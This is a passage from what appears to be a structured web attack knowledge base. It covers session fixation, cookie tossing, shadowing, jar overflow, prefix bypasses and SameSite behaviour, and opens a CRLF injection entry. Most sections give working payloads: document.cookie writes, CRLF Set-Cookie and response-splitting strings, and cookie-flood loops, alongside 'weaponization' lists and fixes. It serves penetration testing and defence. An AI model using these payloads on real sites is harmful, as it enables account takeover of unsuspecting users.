    name: 'Session Fixation and Cookie Injection',
    summary: 'Make the victim browser carry a session identifier the attacker already knows, or write attacker chosen cookies into the victim jar from a place the cookie model trusts.',
    tags: ['session', 'cookies', 'client-side'],
    executionContext: {
      where: 'In the victim browser cookie store when the cookie is written, and in the application session lookup on the server when that cookie is replayed.',
      detail: 'Nothing runs as attacker code, and the write and the read happen on two different machines. The write lands in the victim browser cookie jar, and the browser accepts it because it came from somewhere the cookie model treats as authoritative: the page origin itself, any sibling or parent host that shares the registrable domain, or a Set-Cookie header the application emitted. The read happens later inside the server code that maps an incoming session identifier to a session record, and from the moment the victim authenticates that lookup runs with the victim privileges. The flaw usually lives on the server (an identifier that is not regenerated at the privilege boundary, or a cookie scoped with Domain so every subdomain can write it) while the effect appears in the browser, and the server can never see which host wrote the cookie because attributes are not returned in the Cookie header.',
    },
    howTo: [
      {
        heading: 'Root cause and why it matters',
        body: [
          'Two independent defects feed this attack. The first is a session identifier the server keeps using across a privilege boundary: an anonymous visitor is given an id for a cart or a CSRF token, logs in, and the server upgrades that same id to an authenticated session instead of issuing a new one. The second is that a cookie is not an origin scoped object. Cookies are keyed by domain and path, not by origin, so any host under the same registrable domain can write a cookie the parent will receive, and scheme and port do not isolate them either.',
          'The server sees only name and value pairs. RFC 6265 section 4.2.2 is explicit that the Cookie header carries no attributes, so the application cannot tell whether a cookie came from its own Set-Cookie, from a sibling subdomain, from a takeover of a dangling CNAME, or from a header injection. Anything the application derives from a cookie is therefore derived from data an attacker may have chosen.',
          'The payoff is that the attacker never has to steal anything. They pick a value, get it into the victim jar, wait for the victim to authenticate it, and then replay the value they picked. There is no credential theft, no token exfiltration, and often no XSS on the application origin at all.',
        ],
      },
      {
        heading: 'Where to look',
        body: [
          'Start with anywhere a session identifier travels outside a Set-Cookie header: a query parameter such as PHPSESSID, sid, or SID, a Java path parameter such as ;jsessionid=, an ASP.NET cookieless URL segment, or a hidden form field posted with the login. Any of these means the client can propose the identifier.',
          'Then look for pre authentication sessions. Carts, wishlists, locale pickers, multi step signup wizards, and CSRF token issuance all create a session before anyone has proven who they are. That id is the one you want to plant, because the application already accepts it.',
          'Enumerate every host under the registrable domain, not just the application. Marketing pages, status dashboards, documentation, legacy staging hosts, user content hosts, and customer subdomains in a multi tenant product are all same site, so an XSS or a takeover on any of them is a cookie write against the main application. In a multi tenant product, one tenant subdomain writing cookies for another tenant is the same primitive with no takeover required.',
          'Finally, look for places the application builds a Set-Cookie from request input (a lang or theme or affiliate parameter copied into a cookie), and for any header value that reflects input, which is the CRLF path. Both let you plant cookies without controlling any host at all.',
        ],
        examples: [
          { code: 'https://target/app/;jsessionid=0123456789ABCDEF0123456789ABCDEF', note: 'Servlet URL tracking. If the container still accepts the path parameter, the client picks the id.' },
          { code: 'https://target/(S(lit3py55t21z5v55vlm25s55))/default.aspx', note: 'ASP.NET cookieless session. The id is in the path segment.' },
          { code: 'GET /set-language?lang=en HTTP/1.1  ->  Set-Cookie: lang=en', note: 'A reflected Set-Cookie sink. Try injecting attributes into the value with a semicolon.' },
        ],
      },
      {
        heading: 'Test one: does the identifier rotate at the privilege boundary',
        body: [
          'This is the single test that decides whether classic fixation exists. Take a completely fresh client, load the login page, and record every Set-Cookie name and value. Log in. Record the Set-Cookie on the login response. If the session cookie value is byte for byte the same before and after, the application did not rotate and the pre authentication id you can plant becomes an authenticated id.',
          'Do it with two browsers or two machines, not one. Some applications bind a session to an IP address or a User-Agent fingerprint and will silently drop a transplanted cookie. In a single browser you cannot distinguish "did not rotate" from "rotated but my own browser fingerprint matched", and you will report a false positive.',
          'Login is not the only boundary. Check the identifier again after the MFA step completes, after a password change, after entering a sudo or re-authentication mode, after starting and stopping an admin impersonation, and after redeeming a remember me token. A common real finding is an application that rotates on password submission but keeps the same id across the MFA step, so a session fixed before MFA inherits the fully authenticated state.',
          'Also test the permissive variant separately: send an identifier the server never issued and see whether it creates a session for it. PHP does this when session.use_strict_mode is left at its default of 0, which means you do not even need to harvest a real pre authentication id first.',
        ],
        examples: [
          { code: 'curl -s -c jar.txt -o /dev/null https://target/login && grep -i sess jar.txt', note: 'Capture the pre authentication session cookie into a jar file.' },
          { code: "curl -s -b jar.txt -c jar.txt -d 'user=victim&pass=Passw0rd' https://target/login && grep -i sess jar.txt", note: 'Log in reusing the same jar. The value in jar.txt must be different afterwards. If it is not, fixation is live.' },
          { code: 'curl -i -b "PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" https://target/', note: 'Permissive fixation check: does the server adopt an id it never issued instead of replacing it?' },
          { code: 'curl -i -b "SESSION=<pre-mfa-value>" https://target/account', note: 'Run after the victim clears MFA to see whether the pre MFA id was upgraded rather than replaced.' },
        ],
      },
      {
        heading: 'Classic fixation: delivering the identifier',
        body: [
          'If the identifier can be proposed in a URL, delivery is a link. Send the victim a link that carries the id you already hold, let them log in on that page, then use the id yourself. Everything after that is normal session use, so nothing in the traffic looks anomalous.',
          'If the identifier only travels in a cookie, you need a cookie write, which is the next section. Between the two sits the hidden form field case: host a login form on your own page whose action points at the target and whose hidden session field carries your id, or embed it in an HTML email. This only works where the application reads the session identifier from the body.',
          'Note that a session id in a URL is a defect on its own even without fixation, because it leaks through Referer headers, browser history, proxy logs, and anything the user copies and pastes. Report both.',
        ],
        examples: [
          { code: 'https://target/login?PHPSESSID=1f4a9c2b7e0d6a3f8c5b2e9d4a7f0c31', note: 'Fixation by link. Works only where the app accepts a client supplied id.' },
          { code: '<form action="https://target/login" method="POST"><input type="hidden" name="sid" value="KNOWNID"><input name="user"><input name="pass" type="password"></form>', note: 'Fixation by form field on an attacker hosted page.' },
        ],
      },
      {
        heading: 'Writing into someone else jar: the delivery primitives',
        body: [
          'Rank these by what each one costs you. Same origin XSS on the application is the strongest and needs no cookie tricks. Below that sits XSS on any sibling subdomain, which is normally triaged as low severity and is in fact a session write against the parent, because a subdomain may set a cookie with Domain scoped to the parent. A subdomain takeover on a dangling CNAME gives you the same primitive without needing any injection.',
          'Framing matters for delivery. If the victim is on your own site and you iframe a subdomain of the target to run the cookie write, that iframe is third party, and Safari and Firefox block third party cookie writes outright while Chromium partitions or restricts them. A top level navigation to the host you control, or a same site iframe from a page already on the target, does not have that problem. Prefer a link, a popup, or an image or fetch that triggers a Set-Cookie response header from the host you control.',
          'Header injection is the other reliable path. If any response header is built from request input and the newline characters are not stripped, inject your own Set-Cookie line. This is common in redirect Location headers and in headers built by templating in front end proxies. The CRLF Injection entry owns that surface and is the depth for it: which sinks reach a header, the encoding variants that get past a filter, and why an injected cookie arriving from the target origin also defeats the __Host- prefix. What matters here is only that it hands you the cookie write with no sibling host and no takeover required.',
          'Two commonly cited vectors are dead or nearly dead. The meta http-equiv Set-Cookie tag was removed from Chrome in version 65 in 2018, with Firefox and Edge following and the feature removed from the HTML specification, so a markup injection can no longer upgrade itself into a cookie write that way. Separately, an attacker on the network at a plain HTTP host under the same domain can no longer clobber a Secure cookie: Chrome and Firefox ship the "strict secure cookies" behaviour, so an insecure origin cannot set a cookie with the Secure attribute and cannot overwrite an existing Secure cookie of the same name in an overlapping scope. That path still works against cookies that lack Secure, and HSTS with includeSubDomains closes it further.',
        ],
        examples: [
          { code: 'document.cookie = "SESSION=ATTACKERVALUE; Domain=.example.com; Path=/"', note: 'Run from any sibling host such as docs.example.com. The parent application now receives this cookie.' },
          { code: 'Set-Cookie: SESSION=ATTACKERVALUE; Domain=.example.com; Path=/; Max-Age=31536000', note: 'The response header version, served from a subdomain you took over. Survives the browser session.' },
          { code: '/redirect?next=%0d%0aSet-Cookie:%20SESSION=ATTACKERVALUE;%20Domain=.example.com;%20Path=/', note: 'CRLF injection into a redirect response splits in a Set-Cookie header the browser attributes to the application itself.' },
          { code: '/set-language?lang=en;%20Domain=.example.com;%20Path=/;%20Max-Age=0', note: 'Attribute injection into a reflected Set-Cookie sink. Test whether the value is terminated properly.' },
          { code: '<meta http-equiv="Set-Cookie" content="SESSION=X">', note: 'Historical only. Removed from Chrome 65, Firefox, and Edge, and dropped from the HTML spec. Do not report it as live.' },
        ],
      },
      {
        heading: 'Cookie tossing and shadowing: two cookies, one name',
        body: [
          'A subdomain may set a cookie with Domain pointing at the parent, but it cannot delete or overwrite the parent host only cookie, because a host only cookie and a domain scoped cookie with the same name are two separate entries in the jar. The result is not replacement, it is shadowing: the browser now holds two cookies called SESSION and sends both in one Cookie header.',
          'Ordering is decided by the browser, and it is deterministic. RFC 6265 section 5.4 sorts the cookie list by descending path length first, then by ascending creation time. A cookie you set at Path=/account/transfer is therefore sent before the real cookie set at Path=/, on every request to that path. Choose the longest path that still matches the endpoint you care about.',
          'Which of the two the application actually uses is decided by the server side parser, not by the browser, and the parsers disagree. The cookie parser used by Express keeps the first occurrence it sees and ignores later duplicates. Django parse_cookie is a hand written splitter (it borrows only cookies._unquote from the standard library) that assigns each name into a dict as it goes, so the last occurrence wins. Python http.cookies.SimpleCookie also last-wins, but Django does not use it for parsing, so do not infer one from the other. RFC 6265bis tells servers not to rely on serialization order at all, which is good advice and means you must determine the behaviour empirically rather than reason about it.',
          'To determine it, set the same name twice with distinguishable values at different paths and find any endpoint that echoes back what the server read: a whoami or profile response, a debug or error page, an email confirmation, or simply which account you end up in. Then flip which value has the longer path and see whether the answer changes.',
          'The same primitive applies to any cookie, not just the session. Shadowing the CSRF cookie makes a double submit scheme validate a token pair the attacker chose. Shadowing a tenant, locale, or feature flag cookie changes server behaviour. Tossing a cookie with an expiry in the past at the same scope as the real one deletes the domain scoped copy, which is a forced logout or a broken flow.',
        ],
        examples: [
          { code: 'document.cookie = "SESSION=ATTACKERVALUE; Domain=.example.com; Path=/account/transfer"', note: 'Longer path means the browser sends it first on that endpoint. Sorted per RFC 6265 section 5.4.' },
          { code: 'Cookie: SESSION=ATTACKERVALUE; SESSION=REALVICTIMVALUE', note: 'What the server receives. No attributes, no origin, no way to tell which host wrote which.' },
          { code: 'document.cookie = "csrf=KNOWNTOKEN; Domain=.example.com; Path=/account"', note: 'Fixate the cookie half of a double submit CSRF defence so your forged form field matches.' },
          { code: 'document.cookie = "SESSION=; Domain=.example.com; Path=/; Max-Age=0"', note: 'Deletes only the domain scoped copy. A host only cookie set by the parent is untouched by this.' },
          { code: 'Set A at Path=/ and B at Path=/a/b/c, request /a/b/c, read which value the app reports.', note: 'The empirical test for first wins versus last wins on the target stack.' },
        ],
      },
      {
        heading: 'Cookie jar overflow: evicting what you cannot write',
        body: [
          'When the cookie you want is HttpOnly you cannot read or overwrite it from JavaScript, and when it carries the __Host- prefix a subdomain cannot create it at all. You can still make the browser throw it away. Fill the jar until the browser evicts entries, then write your own cookie into the space that opened up.',
          'RFC 6265 section 6.1 only sets minimums that implementations must support: at least 4096 bytes per cookie, at least 50 cookies per domain, and at least 3000 total. Real browsers allow far more. Chromium currently uses a limit on the order of 180 cookies per domain for each jar. Do not hardcode a threshold, because the specification defines a floor and not an eviction policy, and browsers differ. Detect the plateau instead: keep writing and watch the visible cookie count stop growing.',
          'Two caveats change how much junk you need. Eviction is not strictly oldest first, because the Chromium garbage collector prefers to keep Secure and higher priority cookies, so a live session cookie is harder to displace than stale junk. And your junk has to land in the same bucket as the target, so write it with the same Domain scope the target cookie occupies.',
          'The outcome depends on the prefix. Evicting a plain HttpOnly cookie is useful, because you can recreate the same name from a subdomain without HttpOnly and the server will accept your value. Evicting a __Host- cookie only gets you deletion, because you cannot recreate it from anywhere except the exact origin, so treat that case as a forced logout or a denial of service rather than a fixation.',
        ],
        examples: [
          { code: 'for (let i = 0; i < 500; i++) { document.cookie = "junk" + i + "=" + "A".repeat(64) + "; Domain=.example.com; Path=/"; }', note: 'Flood the jar from a subdomain so the junk shares the bucket the target cookie lives in.' },
          { code: 'let prev = -1; for (let i = 0; i < 800; i++) { document.cookie = "junk" + i + "=AAAA; Path=/"; const n = document.cookie ? document.cookie.split(/; */).length : 0; if (n === prev) break; prev = n; }', note: 'Plateau detection: stop when the visible count stops rising, which is when eviction started.' },
          { code: 'document.cookie = "SESSION=ATTACKERVALUE; Domain=.example.com; Path=/"', note: 'Recreate the evicted name without HttpOnly once the slot is free.' },
        ],
      },
      {
        heading: 'Cookie prefixes: what __Host- and __Secure- really stop',
        body: [
          'The __Secure- prefix means only that the cookie was set with the Secure attribute from an HTTPS page. It says nothing about Domain. A sibling subdomain served over HTTPS may legally set __Secure-SESSION with Domain scoped to the parent, so __Secure- provides essentially no protection against cookie tossing. Treating it as an anti tossing control is the most common misconception in this area.',
          'The __Host- prefix is the real control. It requires Secure, an HTTPS origin, Path=/, and no Domain attribute at all, which forces the cookie to be host only. A subdomain therefore cannot create the parent __Host- cookie, and cannot shadow it with a longer path either, since the prefix pins the path to root.',
          'What __Host- still does not stop: XSS on the application origin itself, because same origin script may set a compliant __Host- cookie legally; eviction by jar overflow, which lets you delete it even though you cannot forge it; and the cookie being sent cross site, which is entirely SameSite territory and unrelated to the prefix.',
          'Prefix validation also has known parser gap bypasses. PortSwigger published these as Cookie Chaos: prepend a Unicode whitespace codepoint so the browser sees an ordinary unprefixed name while a server that trims and normalizes the cookie name reads it as the protected one. Django, which uses the Python strip behaviour that removes U+2000, U+0085, and U+00A0, and ASP.NET, which normalizes names, were both shown vulnerable, and Django declined to treat it as a security issue because their documentation already warns against trusting untrusted subdomains. Safari does not accept multibyte Unicode whitespace in cookie names, but single byte U+00A0 still worked there. The second variant abuses legacy RFC 2109 parsing: a Cookie header beginning with $Version=1 makes Tomcat and Jetty re-split one browser cookie into several server side cookies, letting a forged __Host- entry through. Confirm both against the specific stack before claiming them, because they depend on a browser and server parsing disagreement rather than on a browser bug.',
        ],
        examples: [
          { code: 'document.cookie = "__Secure-SESSION=ATTACKER; Secure; Domain=.example.com; Path=/"', note: 'Legal from any HTTPS subdomain. __Secure- does not block a subdomain write.' },
          { code: 'document.cookie = "__Host-SESSION=ATTACKER; Secure; Domain=.example.com; Path=/"', note: 'Rejected. __Host- forbids the Domain attribute, so the write only succeeds from the exact host with Path=/.' },
          { code: 'document.cookie = String.fromCodePoint(0x2000) + "__Host-SESSION=ATTACKER; Domain=.example.com; Path=/"', note: 'Cookie Chaos whitespace variant. The browser sees an unprefixed name; a server that trims the name sees the protected one.' },
          { code: 'document.cookie = "$Version=1,__Host-SESSION=ATTACKER; Path=/somethingreallylong/; Domain=.example.com"', note: 'Legacy RFC 2109 re-splitting on Tomcat and Jetty. Verify the container actually honours $Version.' },
        ],
      },
      {
        heading: 'SameSite: it governs sending, not setting',
        body: [
          'SameSite decides when a cookie is attached to a request. It does not decide who may create the cookie. A session cookie marked SameSite=Strict is still fully fixable from a sibling subdomain, because a write from sub.example.com to example.com is a same site operation. Do not let a Strict attribute talk you out of testing tossing.',
          'The three values: Strict withholds the cookie on every cross site request, including a top level navigation from another site. Lax sends it only on top level navigations that use a safe method, in practice a GET, so background subresource, iframe, and fetch requests do not carry it. None sends it everywhere and is only accepted alongside Secure.',
          'The default when the attribute is omitted is not uniform, and this is where most testing goes wrong. Chromium treats a missing SameSite as Lax. Firefox attempted Lax by default, hit too much web breakage, and reverted it, so release Firefox still treats a missing attribute as None, with network.cookie.sameSite.laxByDefault sitting there disabled. A CSRF or login CSRF chain that fails in Chrome may work in Firefox on the same target, so test both before concluding anything.',
          'The two minute grace period is narrower than usually described. It only applies when Lax is being applied as a default because the attribute was absent, not when SameSite=Lax was set explicitly. In that case Chromium also sends the cookie on a top level cross site POST if the cookie is at most two minutes old, an intervention shipped for single sign on POST flows and documented as temporary. This is the window that makes a login CSRF land: fixate or obtain a fresh cookie, then immediately drive a top level POST. Confirm it on the browser build in front of you, since it is scheduled for removal. For testing, --enable-features=ShortLaxAllowUnsafeThreshold reduces the window to ten seconds and --enable-features=SameSiteDefaultChecksMethodRigorously removes the exception entirely.',
          'Schemeful SameSite, where enabled, treats http and https of the same host as cross site, which matters when part of the estate is still plaintext.',
        ],
        examples: [
          { code: "document.location = 'https://target/account/transfer?to=attacker&amount=1000'", note: 'Top level GET navigation, which Lax permits. Frameworks that honour a _method override let a POST hide inside it.' },
          { code: 'Set-Cookie: SESSION=x; Secure; HttpOnly; SameSite=Strict  ->  still writable by sub.example.com', note: 'The clearest way to state the boundary: SameSite is about transmission, not about who can write.' },
          { code: 'chrome --enable-features=ShortLaxAllowUnsafeThreshold', note: 'Shortens the Lax as default POST grace window to ten seconds so a test does not need a two minute wait.' },
          { code: 'chrome --enable-features=SameSiteDefaultChecksMethodRigorously', note: 'Disables the Lax plus POST exception so you can test the post removal behaviour.' },
        ],
      },
      {
        heading: 'From a planted cookie to account takeover',
        body: [
          'The proof is a specific four step sequence with two browsers, and a report without it will be argued down. In browser A, obtain the identifier S from an unauthenticated request and record it. In browser B, plant S using the delivery primitive you found, and verify with the DevTools Application panel that the cookie is present with the scope you expect. Still in browser B, log in as the victim account. Now refresh an authenticated page in browser A without ever touching credentials. If browser A shows the victim account, that is the finding, and the screenshot pair is the evidence.',
          'The DevTools cookie table distinguishes a tossed cookie from the real one: a host only cookie shows the bare host in the Domain column, while a domain scoped one shows a leading dot or the parent name, and the Path column shows which one the browser sorts first. Use it to confirm you are looking at two entries and not one overwritten entry.',
          'Session donation is the same primitive run in reverse and is worth reporting separately. Instead of stealing the victim session, force the victim browser into the attacker session, so everything the victim then enters lands in the attacker account: payment card details, uploaded identity documents, search and order history, or a linked third party identity. Applications frequently rotate the id on login and are still vulnerable to this, because the donation happens before login or the victim never realises they are logged in as someone else.',
          'Related chains worth checking once you hold the write primitive: fixating the cookie half of a double submit CSRF token, which is covered further in the CSRF entry; tossing the OAuth state, nonce, PKCE verifier, or account linking cookie at the callback path so the provider response binds to the wrong browser, which the OAuth entry covers at the flow level; and any pre authentication flow such as password reset or email verification that reuses the same session record. The Authentication Bypass entry lists session fixation among its paths in one line, so this entry is the depth for it rather than a repeat.',
        ],
        examples: [
          { code: 'A: curl -s -c a.txt https://target/ ; grep -i sess a.txt', note: 'Step one: attacker obtains an unauthenticated identifier.' },
          { code: 'B: document.cookie = "SESSION=<value from a.txt>; Domain=.example.com; Path=/"', note: 'Step two: plant it in the victim browser from a host you control.' },
          { code: 'A: curl -s -b a.txt https://target/account | grep -i "signed in as"', note: 'Step four: after the victim logs in, the attacker jar is authenticated with no credentials involved.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'This is a state test, not a payload test, so automated scanners will not find it. Work it manually with a proxy in front of both browsers. In Burp, filter Proxy history on responses containing Set-Cookie to build the inventory of every cookie the application issues and where; use Repeater to replay a candidate identifier without the browser interfering; and keep the attacker session pinned with a session handling rule so Burp does not helpfully update your cookie jar mid test and destroy the evidence.',
          'Use separate browser profiles rather than a normal window and an incognito window, because incognito shares some state and complicates screenshots. Chrome DevTools Application, Storage, Cookies gives you the authoritative view of names, values, Domain, Path, Expires, HttpOnly, Secure, SameSite, and Priority. The command line flags in the SameSite section let you test the grace window without waiting.',
          'For the tossing proof you need a host under the target registrable domain that you legitimately control. In a bug bounty that usually means a subdomain takeover you have already reported, a customer or tenant subdomain the product hands out, or a self hosted CNAME the program offers. If you have none of them, demonstrate the primitive locally against a hosts file entry and describe the missing precondition honestly rather than overstating what you proved.',
          'Server side, the fixes to verify are: regenerate the session identifier and invalidate the old one at every privilege boundary, not just at password submission; set session.use_strict_mode to 1 on PHP so client proposed identifiers are rejected; use the __Host- prefix rather than __Secure- on session and CSRF cookies; disable URL based session tracking in servlet containers and cookieless mode in ASP.NET; and reject requests that contain two cookies of the same name with different values, which catches shadowing directly.',
        ],
        examples: [
          { code: 'Burp Proxy history filter: Search "Set-Cookie" with "Responses" enabled', note: 'Inventory every cookie the app issues, and from which host and path.' },
          { code: 'php -i | grep -i use_strict_mode', note: 'Value 0 means the server will adopt an identifier the client invented.' },
          { code: '<session-config><tracking-mode>COOKIE</tracking-mode></session-config>', note: 'Servlet fix that removes the ;jsessionid= URL delivery path.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Plant a pre authentication session identifier, wait for the victim to log in with it, then replay the same value and be that user with no password, no token theft, and no XSS on the application origin.',
          'Supply an identifier the server never issued on a stack that adopts client proposed ids (PHP with session.use_strict_mode left at 0), so the identity the application trusts is one the attacker minted rather than one it generated.',
          'Toss a session cookie at the parent domain from a sibling subdomain, turning a low severity XSS on a docs or marketing host, or a dangling CNAME takeover, into an identity write against the main application.',
          'Shadow the real session cookie with a longer Path so the browser sends the attacker value first, letting the attacker choose which identity a request carries on specific endpoints while the rest of the site behaves normally.',
          'Donate a session: force the victim browser into the attacker authenticated session so the application binds the victim to an account the attacker owns and the victim acts under an identity that is not theirs.',
          'Fixate the cookie half of a double submit CSRF scheme so a forged request presents a matching token pair and the server treats it as originating from the legitimate user.',
          'Toss the OAuth state, nonce, PKCE verifier, or account linking cookie at the callback path so the identity provider response is bound to the wrong browser, attaching the attacker provider identity to the victim session or claiming the victim identity in the attacker browser.',
          'Evict a HttpOnly session cookie by cookie jar overflow and recreate the same name from a scope you can write, forging the value of a cookie JavaScript was never allowed to touch.',
          'Smuggle a forged __Host- prefixed cookie past browser prefix validation with a leading Unicode whitespace codepoint or with $Version=1 legacy re-splitting, so a server that reads the prefix as proof of a same origin write accepts an identifier written by a subdomain.',
          'Inject a Set-Cookie header through CRLF in a redirect or any reflected header so the identifier appears to the browser to have been issued by the application itself.',
        ],
        why: 'The application proves identity by looking up whatever session identifier arrives in the Cookie header, and cookies are scoped by registrable domain and path rather than by origin, with no attribute information returned to the server, so any sibling host or any header the application echoes can decide what that identifier is; once the attacker picks the value and the victim authenticates it, the string the server trusts and the string the attacker holds are the same string.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Aim the fixation link or the tossed cookie at an administrator, so the identifier the attacker already holds becomes an administrative session the moment that admin logs in.',
          'Fixate before a step up boundary the application does not rotate across, such as an MFA challenge, a sudo or re-authentication mode, or an admin impersonation session, so the planted identifier inherits the elevated state rather than being replaced by it.',
          'Toss cookies that carry authorization or tenancy hints the server trusts without re-deriving them, such as a tenant identifier, an impersonation target, or a staff or debug flag, from a sibling host that was never meant to write them.',
        ],
        why: 'Privilege is attached to the session record the identifier points at rather than to the browser that presented it, so an attacker who controls the identifier before an elevation happens ends up holding whatever privilege that record is later granted.',
      },
      tampering: {
        weaponization: [
          'Overwrite or shadow a CSRF token cookie so the integrity check on state changing requests is decided by a value the attacker chose.',
          'Rewrite cookies that drive server behaviour without being re-derived: tenant selector, locale, feature flags, A/B bucket, cart contents, routing or canary hints.',
          'Toss a cookie with an expiry in the past to delete the domain scoped copy of an application cookie from a host that was never meant to write it, breaking or resetting state.',
          'Replace a cookie the server marked HttpOnly by evicting it through jar overflow and recreating it, changing a value the application explicitly declared non writable by the client.',
          'In a donated session, cause the victim to write records into the attacker account, so data is created and attributed under the wrong identity at the source of truth.',
        ],
        why: 'Applications routinely treat the Cookie header as server owned state while it is in fact client supplied and writable by every host under the same registrable domain, so any decision derived from a cookie value becomes an attacker controlled decision.',
      },
      information_disclosure: {
        weaponization: [
          'Read everything the victim can read once the fixated identifier is authenticated, which is the whole authenticated surface rather than a single leaked field.',
          'Harvest what the victim types into a donated session: payment details, uploaded identity documents, address book entries, search and order history, all visible from the attacker own account afterwards.',
          'Collect session cookies passively on a subdomain you control or have taken over, because any cookie the application scoped with a Domain attribute is sent to every host under that domain with no write required at all.',
          'Run the cookie sandwich: set $Version=1 plus a quote opening and a quote closing cookie so a server using legacy RFC 2109 parsing folds the victim HttpOnly cookie into a single quoted value that a reflection point then echoes back, exposing a cookie script cannot read. It needs both a reflection point and a container that still honours $Version quoting, which Tomcat 8.5, 9.0, and 10.0 did by default at the time of the research.',
        ],
        why: 'A session identifier is a bearer credential, so whoever holds it sees what its owner sees; and because cookies are shared across an entire registrable domain rather than an origin, both the read side, a subdomain that simply receives the cookie, and the write side, a subdomain that plants one, cross a boundary the origin model would otherwise enforce.',
      },
      denial_of_service: {
        weaponization: [
          'Cookie bomb: from a subdomain, write many large cookies scoped to the parent so every subsequent request from that browser carries an oversized Cookie header and the origin or CDN answers 400 or 431, locking the victim out until they manually clear cookies.',
          'Evict a __Host- or HttpOnly session cookie by jar overflow when you cannot recreate it, which forces a logout or breaks a multi step flow with no way for the server to intervene.',
          'Toss a foreign or malformed session identifier at a specific long Path so only requests to that path fail authentication, selectively breaking checkout, an admin route, or an API prefix while the rest of the site keeps working and hides the cause.',
          'Delete or shadow the CSRF cookie so every state changing request the victim submits is rejected by the application own defence.',
        ],
        why: 'The browser attaches every matching cookie to every matching request automatically, so an attacker who can write into the jar controls the size and the content of a header the victim cannot choose to stop sending, and can make the target reject its own users.',
      },
      repudiation: {
        weaponization: [
          'Donate a session so the victim actions are recorded against the attacker account, letting the attacker later disown or claim activity at will and destroying the link between the human and the log line.',
          'Rely on the fact that the Cookie header carries no attributes, so no server side log can distinguish an identifier the application issued from one a subdomain or a header injection planted, leaving the investigation with no evidence of the fixation itself.',
          'Exploit a session that is never rotated at login, so one identifier spans the anonymous and the authenticated phases and log entries from before and after authentication share an id that cannot be separated into unattributed and attributed activity.',
        ],
        why: 'Attribution is computed from the session identifier alone, so an attacker who chooses that identifier chooses whose name appears in the log, and the cookie protocol gives the server no way to prove where the value came from.',
      },
    },
  },

  {
    id: 'crlf-injection',
    name: 'CRLF Injection and HTTP Response Splitting',
    summary: 'Smuggle carriage return and line feed bytes into a value the server writes into a response header, an outbound request, or another line oriented protocol, so the attacker authors headers and entire messages the server is supposed to own.',
    tags: ['injection', 'http', 'headers'],
    executionContext: {
      where: 'In whichever parser reads the byte stream the server emitted: the victim browser HTTP parser, a shared cache or reverse proxy, the back-end on a reused keep-alive connection, or an SMTP, memcached, or Redis server on an outbound socket.',
      detail: 'Nothing runs as code on the application server. The application concatenates attacker input into a header value (or into a mail header, a cache command, a line oriented session file) and writes it out, and the newline promotes that input from data into structure. The effect then executes in the next parser downstream, and which parser that is decides the whole impact. If it is the victim browser, you get cookie setting, redirects, and script in the target origin. If it is a CDN or reverse proxy, you get a poisoned entry served to everyone and, on a persistent connection, responses handed to the wrong client. If it is the back-end on the far side of a front-end that downgraded HTTP/2 to HTTP/1.1, you get a second request the front-end never authorized. If it is a mail transfer agent or a key-value store on an outbound socket, you get commands in that protocol instead. The flaw lives in the application code or proxy configuration that failed to strip CR and LF; the exploit lives entirely in the parser at the other end of the wire.',
    },
    howTo: [
      {
        heading: 'Root cause, and the difference between header injection and response splitting',
        body: [
          'HTTP/1.1 is a text protocol whose only structural delimiter is the line break. A response is a status line, then one header per line, then a blank line, then the body. If attacker input lands in a header value and the CR and LF bytes survive, the attacker stops being the content of a field and starts being the author of the next field.',
          'Two outcomes follow, and confusing them wastes time. Header injection means you append extra headers to the response the server already started: one CRLF, then your header name, colon, value. Response splitting means you terminate that response entirely and write a complete second one: close the header block with a blank line, force the first body to zero length, then emit your own status line, your own headers, and your own body. Splitting is strictly more powerful because the second response is yours end to end, including its Content-Type and its Content-Security-Policy, but it requires something downstream that will read two responses off one connection.',
          'This is the same primitive as the Log Injection entry, aimed at a different sink. There the newline forges a log line; here it forges a header. If your injection point is a logged field rather than a response header, read that entry instead of this one.',
        ],
        examples: [
          { code: 'Header injection:   value%0d%0aX-Injected:%20yes', note: 'One CRLF, then a new header. The original response continues normally.' },
          { code: 'Response splitting: value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E', note: 'Content-Length 0 ends the real response, then a full second response the attacker wrote from the status line down.' },
        ],
      },
      {
        heading: 'Where input reaches a header',
        body: [
          'Redirects are the richest sink because the destination is nearly always built from input. Test every next, url, return, returnTo, redirect, dest, continue, goto, and callback parameter, plus the post-login and post-logout landing values, and the path itself on servers that echo it into Location. Anything that produces a 3xx is worth a probe.',
          'Set-Cookie is the second sink: language, theme, currency, locale, tracking, affiliate, referral, and last-visited values are commonly written straight back as cookies. Then come custom headers built from input: X-Request-Id and correlation identifiers echoed back, Content-Disposition filename on a download, Link and Refresh headers, and Access-Control-Allow-Origin reflected from your Origin.',
          'Do not stop at the application. Reverse proxies write headers too, and their configuration language decodes things the application never sees. The classic nginx case is using $uri or $document_uri inside a redirect, because those variables hold the normalized and percent-decoded path, so a %0d%0a in the request path becomes a real newline in the Location header. The safe variable is $request_uri, which preserves the raw encoding. Also look at anything that copies a request header value into a new outbound header: X-Forwarded-For, X-Forwarded-Host, X-Real-IP, and custom identity headers a gateway stamps on before forwarding.',
          'Finally, look at server side HTTP clients. A back-end service that builds a request from a configuration value or a user field is a header injection sink even though no browser is involved: RestSharp AddHeader did not sanitize CR and LF until 112.0.0 (CVE-2024-45302, which affects 107 onwards), and Refit copied header attribute values verbatim until 7.2.22 (CVE-2024-51501, also fixed in 8.0.0). Both turn an internal string into extra headers or a second request against an internal service.',
        ],
        examples: [
          { code: 'nginx vulnerable:  location / { return 302 https://example.com$uri; }', note: '$uri is decoded and normalized, so %0d%0a in the path becomes a real newline in Location.' },
          { code: 'nginx fixed:       location / { return 302 https://example.com$request_uri; }', note: '$request_uri keeps the raw percent-encoding, so the newline never materializes.' },
        ],
      },
      {
        heading: 'Detecting it',
        body: [
          'Use one unmistakable marker and one raw view of the wire. The marker everyone converges on is an injected cookie with a unique name, because Set-Cookie is trivial to grep for and cannot be confused with the application echoing your string somewhere. Send it as a suffix on a parameter you already know is reflected into a header, then read the raw response.',
